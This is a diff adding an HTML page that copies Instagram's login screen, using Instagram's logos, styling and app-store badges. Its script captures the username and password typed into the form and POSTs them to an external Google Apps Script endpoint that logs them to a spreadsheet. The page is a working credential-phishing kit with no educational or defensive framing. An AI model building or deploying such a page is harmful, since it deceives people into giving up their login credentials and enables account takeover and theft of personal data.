@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" type="image/x-icon">
+	
+    <style>
+        h1 {
+            font-family: 'Roboto', Instagram Sans;
+        }
+
+        /* Basic reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', Instagram Sans;
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: white;
+            width: 350px;
+            padding: 40px 30px;
+            border: 1px solid #dbdbdb;
+            border-radius: 0px; /* Square corners */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            margin-bottom: 10px; /* Margin to separate boxes */
+        }
+
+        /* Adjust logo image size */
+        .container img {
+            width: 175px; /* Adjust the width as needed */
+            margin-bottom: 20px; /* Space below the logo */
+        }
+
+        .input-box {
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        .input-box input {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            outline: none;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            font-weight: bold;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .login-btn:disabled {
+            background-color: #b2dffc;
+        }
+
+        .options {
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .options a {
+            text-decoration: none;
+            color: #0095f6;
+            font-size: 14px;
+        }
+
+        .or-divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #8e8e8e;
+            margin: 20px 0;
+        }
+
+        .or-divider::before,
+        .or-divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .or-divider:not(:empty)::before {
+            margin-right: 18px;
+        }
+
+        .or-divider:not(:empty)::after {
+            margin-left: 18px;
+        }
+
+        /* Sign-up box with square corners */
+        .signup-container {
+            background-color: white;
+            width: 350px;
+            padding: 20px 30px;
+            border: 1px solid #dbdbdb;
+            border-radius: 0px; /* Square corners */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .signup-link {
+            font-size: 14px;
+        }
+
+        .signup-link a {
+            text-decoration: none;
+            color: #0095f6;
+            font-weight: bold;
+        }
+
+        /* App links outside the boxes */
+        .app-links-outside {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .app-links-outside img {
+            height: 40px; /* Adjust as needed */
+            margin: 0 5px; /* Space between images */
+            background: none; /* No background */
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Container -->
+    <div class="container">
+        <!-- Replace this image link with the one you want to use -->
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo">
+        <form name='submit-to-google-sheet'>
+            <div class="input-box">
+                <input type="text" name='username' placeholder="Phone number, username, or email" required>
+            </div>
+            <div class="input-box">
+                <input type="password" name='password' placeholder="Password" required>
+            </div>
+            <button class="login-btn" disabled>Log In</button>
+            <div class="or-divider">OR</div>
+            <div class="options">
+                <a href="#">Forgot password?</a>
+            </div>
+        </form>
+    </div>
+
+    <!-- Sign-up Box -->
+    <div class="signup-container">
+        <div class="signup-link">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+    </div>
+
+    <!-- App download links outside the boxes with no background -->
+    <div class="app-links-outside">
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play Store">
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Apple App Store">
+    </div>
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbzIkB9RlGKWWGFM9QGgJmnLXF3BU-WYGPjBL7qhJNW-p2JiO_b1d-zBJ8nIkvjqSzNM/exec';
+        const form = document.forms['submit-to-google-sheet'];
+
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+                .then(response => console.log('Success!', response))
+                .catch(error => console.error('Error!', error.message));
+        });
+
+        const loginBtn = document.querySelector('.login-btn');
+        const inputs = document.querySelectorAll('.input-box input');
+
+        inputs.forEach(input => {
+            input.addEventListener('input', () => {
+                loginBtn.disabled = !(inputs[0].value && inputs[1].value);
+            });
+        });
+    </script>
+</body>
+</html>
